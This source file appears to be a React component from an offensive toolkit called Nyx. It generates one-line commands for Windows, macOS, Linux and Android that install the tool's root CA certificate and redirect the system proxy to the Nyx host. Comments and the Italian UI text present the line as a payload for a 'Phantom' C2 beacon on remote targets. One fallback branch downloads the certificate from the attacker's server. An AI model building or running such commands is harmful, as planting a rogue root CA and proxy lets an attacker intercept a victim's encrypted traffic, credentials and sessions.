import { useEffect, useMemo, useState } from 'react'
import { ClipboardCopy, Check, AlertTriangle } from 'lucide-react'

type TargetOs = 'windows' | 'macos' | 'linux' | 'android'

interface DeployBoxProps {
  host: string
  proxyPort: number
  caPort?: number
}

const OS_OPTIONS: { id: TargetOs; label: string }[] = [
  { id: 'windows', label: 'Windows' },
  { id: 'macos', label: 'macOS' },
  { id: 'linux', label: 'Linux / IoT' },
  { id: 'android', label: 'Android' },
]

function toB64(text: string): string {
  try {
    return btoa(String.fromCharCode(...new TextEncoder().encode(text)))
  } catch {
    return ''
  }
}

// Where the PEM lives on the target for a given OS.
function pemPath(os: TargetOs): string {
  return os === 'android' ? '/data/local/tmp/nyx-ca.pem' : '/tmp/nyx-ca.pem'
}

function hostOf(proxy: string): string {
  return proxy.split(':')[0]
}

function portOf(proxy: string): string {
  return proxy.split(':')[1] || '8080'
}

// Builds a SINGLE-LINE command for the given OS. Everything (write CA from the
// embedded base64, import it into the trust store, point the system proxy at
// Nyx) is collapsed into one line so it can be pasted into a C2 beacon or a
// single-line exec shell without quoting headaches. When the CA base64 is not
// available the same line falls back to downloading it at runtime.
function buildOneLiner(os: TargetOs, caB64: string, caUrl: string, proxy: string): string {
  const dest = pemPath(os)
  const host = hostOf(proxy)
  const port = portOf(proxy)

  const caWrite =
    os === 'windows'
      ? caB64
        ? `$b='${caB64}';$p="$env:TEMP\\nyx-ca.pem";[IO.File]::WriteAllBytes($p,[Convert]::FromBase64String($b))`
        : `(New-Object Net.WebClient).DownloadFile('${caUrl}',"$env:TEMP\\nyx-ca.pem")`
      : caB64
        ? `echo '${caB64}' | base64 -d > ${dest}`
        : `curl -fsSL '${caUrl}' -o ${dest}`

  switch (os) {
    case 'windows': {
      const caInstall = `Import-Certificate -FilePath "$env:TEMP\\nyx-ca.pem" -CertStoreLocation Cert:\\LocalMachine\\Root`
      const proxySet =
        `netsh winhttp set proxy ${proxy};` +
        `Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyEnable -Value 1;` +
        `Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyServer -Value '${proxy}'`
      return `${caWrite};${caInstall};${proxySet}`
    }
    case 'macos': {
      const caInstall = `sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ${dest}`
      const proxySet =
        `networksetup -setwebproxy 'Wi-Fi' ${host} ${port} && ` +
        `networksetup -setsecurewebproxy 'Wi-Fi' ${host} ${port} && ` +
        `sudo networksetup -setproxyautodiscovery 'Wi-Fi' off`
      return `${caWrite} && ${caInstall} && ${proxySet}`
    }
    case 'linux': {
      const caInstall = `sudo cp ${dest} /usr/local/share/ca-certificates/nyx-ca.crt && sudo update-ca-certificates`
      const proxySet =
        `gsettings set org.gnome.system.proxy mode 'manual' && ` +
        `gsettings set org.gnome.system.proxy.http host '${host}' && ` +
        `gsettings set org.gnome.system.proxy.http port ${port} && ` +
        `gsettings set org.gnome.system.proxy.https host '${host}' && ` +
        `gsettings set org.gnome.system.proxy.https port ${port}`
      return `${caWrite} && ${caInstall} && ${proxySet}`
    }
    case 'android': {
      const caInstall = `mkdir -p /data/misc/user/0/cacerts-added && cp ${dest} /data/misc/user/0/cacerts-added/`
      const proxySet = `settings put global http_proxy ${proxy}`
      return `${caWrite} && ${caInstall} && ${proxySet} && reboot`
    }
  }
}

export function DeployBox({ host, proxyPort, caPort }: DeployBoxProps) {
  const [os, setOs] = useState<TargetOs>('windows')
  const [copied, setCopied] = useState(false)
  const [caB64, setCaB64] = useState('')
  const [caMissing, setCaMissing] = useState(false)

  useEffect(() => {
    let cancelled = false
    fetch('/api/ca-certificate')
      .then((r) => {
        if (!r.ok) throw new Error('no cert')
        return r.text()
      })
      .then((pem) => {
        if (!cancelled) setCaB64(toB64(pem))
      })
      .catch(() => {
        if (!cancelled) {
          setCaB64('')
          setCaMissing(true)
        }
      })
    return () => {
      cancelled = true
    }
  }, [])

  const resolveHost = (host || '').trim() || 'NYX-IP'
  const safeCaPort = caPort || proxyPort || 18081
  const proxy = `${resolveHost}:${proxyPort || 8080}`
  const caUrl = `http://${resolveHost}:${safeCaPort}/api/ca-certificate`

  const command = useMemo(() => buildOneLiner(os, caB64, caUrl, proxy), [os, caB64, caUrl, proxy])

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(command)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch {
      /* clipboard unavailable in test env */
    }
  }

  return (
    <div className="p-4 rounded-lg border border-gray-800 bg-gray-900/50">
      <div className="flex items-center gap-2 mb-3">
        <ClipboardCopy size={14} className="text-purple-400" />
        <h3 className="text-sm font-semibold text-gray-200">
          Deploy Command (for Phantom beacon)
        </h3>
      </div>
      <p className="text-xs text-gray-400 mb-3 leading-relaxed">
        Comando <em>a riga singola</em> da eseguire sul sistema remoto tramite il
        beacon: installa il CA Nyx e fa il proxy di sistema puntare a{' '}
        <span className="font-mono text-gray-200">{proxy}</span>. Sostituisci{' '}
        {'NYX-IP'} con l'IP/dominio raggiungibile del backend Nyx se il target
        è fuori LAN.
      </p>

      {caB64 ? (
        <p className="text-xs text-green-400 mb-3">
          CA certificate embedded — il comando funziona anche con Nyx spento.
        </p>
      ) : (
        <p className="text-xs text-amber-400 mb-3">
          Certificato CA non caricato:{' '}
          {caMissing
            ? 'sarà scaricato a runtime (servirai Nyx acceso).'
            : 'loading…'}
        </p>
      )}

      <div className="flex flex-wrap gap-1.5 mb-3">
        {OS_OPTIONS.map((opt) => (
          <button
            key={opt.id}
            onClick={() => setOs(opt.id)}
            className={`px-3 py-1.5 text-xs rounded-lg font-medium transition-colors ${
              os === opt.id
                ? 'bg-purple-600 text-white'
                : 'bg-gray-800 text-gray-400 hover:bg-gray-700'
            }`}
          >
            {opt.label}
          </button>
        ))}
      </div>

      <div className="relative">
        <pre className="text-xs font-mono text-gray-300 bg-gray-900 border border-gray-700 rounded-lg p-3 pr-12 overflow-x-auto whitespace-pre leading-relaxed">
          {command}
        </pre>
        <button
          onClick={handleCopy}
          className="absolute top-2 right-2 p-1.5 rounded bg-gray-800 hover:bg-gray-700 text-gray-300 transition-colors"
          title="Copy command"
        >
          {copied ? <Check size={14} className="text-green-400" /> : <ClipboardCopy size={14} />}
        </button>
      </div>
      <p className="text-xs text-gray-500 mt-3">
        {!caB64 && !caMissing && (
          <span className="inline-flex items-center gap-1">
            <AlertTriangle size={12} className="text-amber-400" />
            Importa il CA nel CA portal per incorporare il certificato.
          </span>
        )}
      </p>
    </div>
  )
}
